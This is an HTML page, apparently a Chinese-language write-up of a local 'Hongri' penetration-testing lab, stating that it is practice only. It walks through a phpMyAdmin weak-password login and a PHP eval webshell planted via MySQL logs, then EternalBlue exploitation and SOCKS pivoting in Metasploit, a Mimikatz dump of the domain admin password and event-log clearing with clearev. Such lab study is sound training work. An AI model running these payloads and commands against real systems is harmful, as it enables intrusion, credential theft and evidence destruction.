@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>红日靶场实战复盘</title>
+<style>
+  :root {
+    --bg: #f6f8fa; --card: #ffffff; --ink: #24292f; --accent: #0969da; --accent-soft: #ddf4ff;
+    --success: #1a7f37; --success-soft: #dafbe1; --warn: #9a6700; --warn-soft: #fff8c5;
+    --red: #cf222e; --red-soft: #ffebe9; --mono: "Cascadia Code", Consolas, "Microsoft YaHei", monospace;
+  }
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "Microsoft YaHei", sans-serif;
+    background-color: var(--bg); color: var(--ink); line-height: 1.7;
+    margin: 0; padding: 40px 20px;
+  }
+  .container {
+    max-width: 900px; margin: 0 auto; background: var(--card);
+    border: 1px solid #d0d7de; border-radius: 12px; padding: 40px 48px;
+    box-shadow: 0 4px 12px rgba(0,0,0,0.04);
+  }
+  h1 { font-size: 24px; text-align: center; margin-bottom: 10px; color: #111; }
+  .subtitle { text-align: center; color: #57606a; font-size: 14px; margin-bottom: 30px; }
+  h2 { font-size: 18px; border-bottom: 2px solid #eaeef2; padding-bottom: 8px; margin-top: 36px; color: #111; }
+  h3 { font-size: 15px; margin-top: 24px; color: #333; }
+  .notice { background: #f6f8fa; border-left: 4px solid #8b949e; padding: 15px 20px; border-radius: 0 6px 6px 0; margin-bottom: 30px; font-size: 14px; color: #444; }
+  .command-box { background: #1f242f; color: #e6edf3; border-radius: 8px; padding: 16px 20px; font-family: var(--mono); font-size: 13px; overflow-x: auto; margin: 12px 0 4px; line-height: 1.6; }
+  .command-box span.c { color: #8b949e; }
+  .command-box span.g { color: #7ee787; }
+  .command-box span.r { color: #ff7b72; }
+  .explain { background: #f9fafb; border: 1px solid #e1e4e8; border-radius: 6px; padding: 12px 16px; margin-bottom: 16px; font-size: 14px; color: #333; }
+  .explain strong { color: #0969da; }
+  code { font-family: var(--mono); background: #f3f4f6; padding: 2px 6px; border-radius: 4px; font-size: 13px; }
+  .callout { border: 1px solid #d0d7de; border-radius: 8px; padding: 16px; margin: 16px 0; font-size: 14px; }
+  .callout.info { background: var(--accent-soft); border-color: #a5d6ff; }
+  .callout.warn { background: var(--warn-soft); border-color: #f5e6a8; }
+  .callout.red { background: var(--red-soft); border-color: #ffc1c0; }
+  ul, ol { padding-left: 22px; }
+  li { margin-bottom: 6px; font-size: 14.5px; }
+  p { font-size: 14.5px; }
+</style>
+</head>
+<body>
+<div class="container">
+
+  <h1>红日靶场实战复盘</h1>
+  <div class="subtitle">记录一下外网突破到内网横向，还有最后拿到域管密码的全过程。</div>
+
+  <div class="notice">
+    记录一下本地靶场红日（hongri1）的实战过程。出于隐私，真实 IP、账号密码、Hash 这些全都藏起来了。本地靶场练手，千万别拿去搞没授权的系统，不然真会踩缝纫机。
+  </div>
+
+  <h2>一、外网打点与信息收集</h2>
+  <p>启动靶机后，获取到外网 IP <code>&lt;靶机外网IP&gt;</code>。在 Kali 上添加路由打通网络，随后进行端口扫描。</p>
+  
+  <div class="command-box">
+    <span class="c"># 添加路由，确保 Kali 能连通靶机</span><br>
+    sudo ip route add &lt;靶机网段&gt; via &lt;路由器IP&gt; dev eth0<br>
+    <span class="c"># 测试连通性</span><br>
+    ping &lt;靶机外网IP&gt; <span class="g"># 回显 64 bytes from ... 0% packet loss</span>
+  </div>
+
+  <h3>端口扫描结果</h3>
+  <div class="command-box">
+    nmap -sS -sV -T4 &lt;靶机外网IP&gt;
+  </div>
+  <div class="explain">
+    <strong>回显关键信息：</strong><br>
+    <code>80/tcp open http Apache httpd 2.4.39 (Win64)</code><br>
+    <code>3306/tcp open mysql MySQL (unauthorized)</code><br>
+    <code>445/tcp open microsoft-ds Windows 7 - 10</code>
+  </div>
+  <p>访问 80 端口，发现是 <code>phpStudy 探针 2014</code> 页面，泄露了绝对路径 <code>C:/phpstudy_pro/WWW/index.php</code>。目录扫描发现 <code>/phpMyAdmin/</code> 路径。</p>
+
+  <h2>二、获取 WebShell（phpMyAdmin 弱口令与日志写马）</h2>
+  <p>访问 <code>http://&lt;靶机外网IP&gt;/phpMyAdmin/</code>，尝试弱口令 <code>root / root</code>，成功登录后台。</p>
+  
+  <h3>1. 尝试 OUTFILE 写马（失败）</h3>
+  <div class="command-box">
+    SELECT '&lt;?php @eval($_POST["cmd"]); ?&gt;' INTO OUTFILE 'C:/phpstudy_pro/WWW/shell.php';
+    <span class="r"># 报错：#1290 - The MySQL server is running with the --secure-file-priv option...</span>
+  </div>
+
+  <h3>2. 改用 MySQL 日志包含写马（成功）</h3>
+  <div class="command-box">
+    SET GLOBAL general_log = 'ON';<br>
+    SET GLOBAL general_log_file = 'C:/phpstudy_pro/WWW/shell.php';<br>
+    SELECT '&lt;?php @eval($_POST["cmd"]); ?&gt;';<br>
+    SET GLOBAL general_log = 'OFF';
+  </div>
+
+  <h3>3. 验证后门</h3>
+  <p>浏览器访问 <code>http://&lt;靶机外网IP&gt;/shell.php?c=whoami</code>。</p>
+  <div class="explain">
+    <strong>回显：</strong> 大量数据库日志乱码中包含 <code>nt authority\system</code>。<br>
+    <strong>结论：</strong> 成功获取 WebShell，且直接获得系统最高权限。
+  </div>
+
+  <h2>三、内网穿透与隧道建立</h2>
+  <p>在 WebShell 中执行 <code>ipconfig</code>，发现双网卡结构：外网 <code>&lt;靶机外网IP&gt;</code>，内网 <code>&lt;内网跳板机IP&gt;</code>。确认跳板机身份。</p>
+
+  <h3>1. 尝试使用 frpc（失败）</h3>
+  <ul>
+    <li>上传 <code>frpc.exe</code> 失败（WebShell 上传限制在 2MB/8MB 左右）。</li>
+    <li>压缩后上传失败（新建文件被拦截）。</li>
+    <li>使用 <code>certutil</code> 或 <code>powershell</code> 下载静默失败。</li>
+    <li><strong>结论：</strong> 受限于 WebShell 生命周期，无法维持 <code>frpc.exe</code> 后台常驻，果断放弃。</li>
+  </ul>
+
+  <h3>2. 改用 MSF 建立隧道（成功）</h3>
+  <p>使用 Metasploit 重新拿下外网机器，并用 autoroute 和 socks_proxy 建立隧道。</p>
+  <div class="command-box">
+    sudo msfconsole<br>
+    use exploit/windows/smb/ms17_010_eternalblue<br>
+    set RHOSTS &lt;靶机外网IP&gt;<br>
+    set LHOST &lt;Kali IP&gt;<br>
+    run <span class="g"># 回显：Meterpreter session 1 opened</span><br><br>
+    <span class="c"># 在 meterpreter 下添加内网路由</span><br>
+    run autoroute -s &lt;内网网段&gt;<br>
+    <span class="g"># 回显：[+] Added route to &lt;内网网段&gt; via &lt;靶机外网IP&gt;</span><br><br>
+    <span class="c"># 挂起会话并启动代理</span><br>
+    background<br>
+    use auxiliary/server/socks_proxy<br>
+    set SRVPORT 1080<br>
+    run -j <span class="g"># 回显：Auxiliary module running as background job</span>
+  </div>
+
+  <h2>四、内网横向移动</h2>
+  <p>利用 MSF 的自动路由，直接对内网机器 <code>&lt;内网跳板机IP&gt;</code> 发起攻击。</p>
+  <div class="command-box">
+    use exploit/windows/smb/ms17_010_eternalblue<br>
+    set RHOSTS &lt;内网跳板机IP&gt;<br>
+    set LHOST &lt;Kali IP&gt;<br>
+    run <span class="g"># 回显：Meterpreter session 2 opened</span><br>
+    getuid <span class="g"># 回显：Server username: NT AUTHORITY\SYSTEM</span><br>
+    sysinfo <span class="g"># 回显：Computer: STU1, Domain: GOD</span>
+  </div>
+  <p>成功拿下内网第一台机器（STU1），并确认其已加入 <code>GOD</code> 域。</p>
+
+  <h2>五、攻击域控受阻</h2>
+  <p>尝试使用相同漏洞攻击域控 <code>&lt;域控IP&gt;</code>，遭遇全面防守。</p>
+  <ul>
+    <li><strong>MS17-010：</strong> 提示 <code>The target is not vulnerable</code>（域控已打补丁）。</li>
+    <li><strong>SMB（445）：</strong> 执行 <code>dir \\&lt;域控IP&gt;\C$</code>，回显 <code>系统发生 67 错误</code>（端口被封）。</li>
+    <li><strong>WMI（135）：</strong> 执行 wmic 命令，回显 <code>RPC 服务器不可用</code>（端口被封）。</li>
+    <li><strong>WinRM（5985）：</strong> 执行 winrs 命令，回显 <code>Winrs error: WinRM 客户端无法处理该请求</code>（端口被封）。</li>
+    <li><strong>RDP（3389）：</strong> 使用 <code>portfwd</code> 转发并尝试 <code>xfreerdp</code> 登录，回显 <code>ERRCONNECT_CONNECT_CANCELLED</code>（端口被封）。</li>
+  </ul>
+  <div class="callout red">
+    <strong>结论：</strong> 域控的防火墙极其严格，SMB、WMI、WinRM、RDP 等常用入站端口全部被封禁，无法从外部直接攻破，放弃强攻，转为内部窃取凭据。
+  </div>
+
+  <h2>六、核心战果：Mimikatz 内存抓取</h2>
+  <p>既然外部门被封死，直接在内网跳板机（STU1）的内存中提取登录凭据。</p>
+  <div class="command-box">
+    <span class="c"># 在 STU1 的 meterpreter 下加载 Kiwi（Mimikatz）</span><br>
+    load kiwi <span class="g"># 回显：Success.</span><br><br>
+    <span class="c"># 提取所有凭据</span><br>
+    creds_all
+  </div>
+  <div class="explain">
+    <strong>回显关键信息：</strong><br>
+    <code>Username: Administrator</code><br>
+    <code>Domain: GOD.ORG</code><br>
+    <code>Password: &lt;已脱敏的域管理员明文密码&gt;</code><br>
+    <strong>战果：</strong> 成功从内存中抓取到域管理员（GOD.ORG\Administrator）的明文密码，这在真实渗透中意味着极高价值。
+  </div>
+
+  <h2>七、清理战场与环境恢复</h2>
+  <p>拿到密码后，执行清理操作，并将网络模式恢复为正常状态。</p>
+  <div class="command-box">
+    <span class="c"># 清理目标机器系统日志</span><br>
+    clearev<br>
+    <span class="c"># 退出会话</span><br>
+    exit<br>
+    background<br>
+    sessions<br>
+    exit
+  </div>
+  <p>回到物理机，以管理员身份执行 <code>netsh interface portproxy reset</code> 清理本地网络环境。关闭靶机，将 Kali 虚拟机网络模式由“桥接”改为“NAT模式”，确保能正常访问互联网。</p>
+
+  <div class="callout warn" style="margin-top: 30px; font-size: 13px;">
+    <strong>合规声明与备注</strong><br>
+    本文纯属本地靶场练手，合法合规。现实里千万别手贱去扫没授权的系统，不然喝茶去就麻烦了。
+  </div>
+
+</div>
+</body>
+</html>
